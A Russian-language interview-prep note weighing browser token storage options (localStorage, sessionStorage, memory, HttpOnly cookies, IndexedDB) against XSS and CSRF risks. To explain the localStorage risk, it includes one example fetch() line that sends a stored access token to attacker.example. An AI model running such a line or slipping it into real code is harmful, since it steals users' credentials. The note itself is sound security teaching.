# Где хранить токены в браузере?

> [!summary]
> Идеального места для токенов в браузере нет. `localStorage` удобен, но доступен JavaScript и уязвим при XSS. `HttpOnly` cookie защищает от чтения JS, но требует CSRF-защиты. Memory снижает persistence, но усложняет refresh после reload.

## Варианты хранения

| Место | Плюсы | Риски |
|---|---|---|
| `localStorage` | просто, переживает reload | доступен при XSS |
| `sessionStorage` | очищается при закрытии tab/session | доступен при XSS |
| memory | не хранится постоянно | пропадает при reload |
| `HttpOnly` cookie | JS не читает token | browser отправляет автоматически, нужен CSRF control |
| IndexedDB | удобно для больших данных | доступен при XSS |

## Почему localStorage спорный?

```ts
localStorage.setItem('accessToken', token);
```

Если в приложении есть XSS, malicious script может сделать:

```ts
fetch('https://attacker.example/steal?token=' + localStorage.getItem('accessToken'));
```

Поэтому хранить долгоживущие refresh tokens в `localStorage` опасно.

## Почему HttpOnly cookie не идеальна?

```http
Set-Cookie: refresh=abc; HttpOnly; Secure; SameSite=Lax
```

JavaScript не может прочитать cookie, но browser может автоматически отправить ее на server. Поэтому появляется CSRF-риск, особенно для state-changing requests.

## Практичный browser-подход

Частый вариант:

- refresh token/session id в `HttpOnly Secure SameSite` cookie;
- short-lived access token в memory;
- refresh endpoint защищен CSRF/SameSite/origin checks;
- logout инвалидирует refresh/session на сервере.

Это не единственный правильный вариант, но он хорошо показывает компромиссы.

## Что важно сказать на собеседовании?

Не нужно говорить "токены всегда хранить только в X". Лучше объяснить threat model:

- боимся XSS;
- боимся CSRF;
- нужен ли silent refresh;
- browser app или mobile app;
- можно ли использовать backend-for-frontend;
- как работает logout и token revocation.

## Мини-шпаргалка

- `localStorage` удобен, но доступен JS.
- `HttpOnly` cookie защищает от чтения JS, но требует CSRF-защиты.
- Memory уменьшает persistence, но сложнее UX.
- Refresh token чувствительнее access token.
- Выбор хранения зависит от threat model.
